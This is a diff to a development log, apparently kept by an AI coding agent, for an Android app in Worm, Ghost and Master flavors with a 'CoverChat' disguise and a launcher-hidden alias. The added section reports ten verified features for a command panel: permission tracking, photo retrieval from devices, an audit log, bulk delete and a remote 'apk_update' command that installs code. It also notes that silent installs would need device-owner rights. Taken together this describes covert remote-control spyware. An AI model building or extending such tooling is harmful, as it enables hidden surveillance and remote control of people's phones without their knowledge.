@@ -294,3 +294,22 @@ All three vanish from launcher simultaneously; re-showing via the hidden alias s
 - **Android**: `deviceId()` now `DeviceIdDeriver.derive(ANDROID_ID, packageName)` — per-package derived id so **co-installed flavors register as distinct devices**. Heartbeat payload includes `BuildConfig.FLAVOR` as `appType`. `CoverChat` uses the same derivation.
 - **Panel**: `appTypeFilter` chip-select (Worm/Ghost/Master), `appTypeBadge` pill column on the devices table (blue/purple/green), badge on device detail header, `GET /api/v1/devices.csv` export with `appType` column + toolbar CSV button.
 - **Verified**: all 3 flavors enrolled as separate rows (ids `9f56ba44…`,`c82af117…`,`5bae9d86…`), heartbeats set `appType=worm/ghost/master` online; CSV shows the column; panel screenshots `.shots/t7_apptype_badges.png` (all types) + `t7_worm_filter.png` (worm-only rows).
+
+## Mission-C T8 — 10 additions — PASS (2026-11-22)
+
+All live and verified on emulator-5554 + real backend + real panel (VITE_USE_BACKEND):
+
+| # | Addition | Evidence |
+|---|---|---|
+| 1 | Permission-revoked banner | `stats.missingPerms` (real `SystemPermissionChecker` states in heartbeat) → red detail banner; 11 keys listed after fresh install |
+| 2 | 15-min idle | Server `stateOf()`: online ≤90s / idle ≤15min / offline. 8min→`idle`, 20min→`offline`; خامل + `dot-amber` in list |
+| 3 | Audit log | `audit_events` model; written on enroll/command_queued/command_result/device_updated/reconnect/device_deleted; feed on detail (9 rows) |
+| 4 | Rename + notes | `PATCH /devices/:id` {name≤80, notes≤2000}; meta-edit row + حفظ; verified rename landed |
+| 5 | Offline >24h alert | Amber banner when state∉{online,idle} && lastSeen>24h — visible on −26h scratch device |
+| 6 | Alt sort | sortKey select: الانضمام/آخر ظهور/الاسم — name sort verified (dev-al first) |
+| 7 | Photo preview | `GET /devices/:id/photos/:hash/file` streams drop-file by sha256 (404 bad hash); modal item click → blob overlay |
+| 8 | Bulk select | per-row checkbox + select-all + حذف(N) bulk delete |
+| 9 | CSV export | (T7) `/devices.csv` incl. appType — fixed vite-proxy path |
+| 10 | APK version + update | `apkVersion` in heartbeat (v1.0 chip); `apk_update` cmd → download→FileProvider install intent → **real system update sheet** (`.shots/t8_install_sheet2.png`, `executed downloaded=11414747 install_intent`) |
+
+Android: `REQUEST_INSTALL_PACKAGES` + FileProvider (`{appId}.files`, cache-path) added. Silent install needs device-owner — the sheet is the honest emulator boundary.
